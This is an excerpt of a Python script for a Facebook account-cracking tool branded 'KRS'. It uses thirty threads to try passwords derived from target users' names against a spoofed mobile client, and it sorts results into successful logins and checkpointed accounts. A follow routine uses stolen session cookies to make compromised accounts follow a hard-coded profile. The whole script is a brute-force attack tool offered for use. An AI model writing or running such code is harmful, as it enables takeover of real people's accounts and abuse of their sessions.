...
from concurrent.futures import ThreadPoolExecutor as zakhmikrs
...
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 11; V2033 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 GSA/12.44.23.23.arm64
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    input("\x1b[1;97mPress enter to back KRS Menu ")
	    zakhmi()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[KRS] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
    ...
    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id= 100039421542814 ', cookies={'cookie': coki}).text, 'html.parser')
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print('\033[1;37m Cracking Started...')
            print(47*"-")
            with zakhmikrs(max_workers=30) as krsworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
